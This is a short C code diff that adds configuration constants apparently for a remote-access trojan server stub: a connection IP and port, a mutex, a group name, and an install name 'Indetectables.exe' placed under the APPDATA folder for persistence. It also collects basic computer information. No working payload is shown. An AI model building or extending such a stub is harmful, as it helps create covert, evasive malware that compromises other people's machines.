@@ -2,10 +2,15 @@
 
 #define CONNECTION_IP "127.0.0.1"
 #define CONNECTION_PORT 1234
+#define CONNECTION_PASSWORD
+#define SERVER_MUTEX "{1234-1234}"
+#define SERVER_GROUP "Default"
+#define SERVER_INSTALL_NAME "Indetectables.exe"
+#define SERVER_INSTALL_PATH getenv("APPDATA")
 
 struct COMPUTER
 {
-    char NAME, RAM
+    char NAME, RAM;
     char ARCHITECURE[3]; //x86 or x64
 } info_comp;
 
